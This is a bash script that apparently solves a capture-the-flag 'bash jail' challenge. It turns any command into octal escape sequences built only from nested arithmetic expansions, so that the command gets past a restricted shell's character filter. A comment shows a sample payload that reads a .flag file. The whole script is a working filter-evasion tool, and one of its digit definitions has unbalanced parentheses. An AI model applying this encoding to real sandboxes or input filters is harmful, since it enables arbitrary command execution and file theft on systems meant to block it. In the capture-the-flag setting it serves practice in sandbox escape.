#!/bin/bash
#run bash<<<{cat,.flag}

zero='$((1-1))'
one='1'
two='$((1<<1))'
three='$(($(($((1<<1))<<1))-1))'
four='$(($((1<<1))<<1))'
five='$(($(($(($(($((1<<1))<<1))-1))<<1))-1))'
six='$(($(($(($((1<<1))<<1))-1))<<1))'
seven='$(($(($(($((1<<1))<<1))<<1))-1))'
eight='$(($(($((1<<1))<<1))<<1))'
nine='$(($(($(($(($(($(($((1<<1))<<1))-1))<<1))-1))<<1))-1'


#convert char to octal
function char_to_oct(){
echo $(showkey -a  <<<$(echo $1) 2>/dev/null|grep 0x|head -1|awk '{ print $2}'|tail -c +2|head -c -1)
}
#change number to its correspondance 
function iterate_numbers(){
case $1 in 
0)
echo $zero
;;
1)
echo $one
;;
2)
echo $two
;;
3)
echo $three
;;
4)
echo $four
;;
5)
echo $five
;;
6)
echo $six
;;
7)
echo $seven
;;
8)
echo $eight
;;
9)
echo $nine
;;
esac
}


#construct the obfuscated command that solves the jail
obfuscated_cmd="\""
read -p "Enter command to run in jail " cmd
for (( i=0; i<${#cmd}; i++ )); do
  octal_value=$(char_to_oct "${cmd:$i:1}")
  obfuscated_cmd+="\\$\'\\\\"
  for (( j=0; j<${#octal_value}; j++ )); do
    obfuscated_cmd+=$(iterate_numbers "${octal_value:$j:1}")
  done
  obfuscated_cmd+="\'"
done
obfuscated_cmd+="\""


echo "Copy this command into jail : "
echo "$obfuscated_cmd"
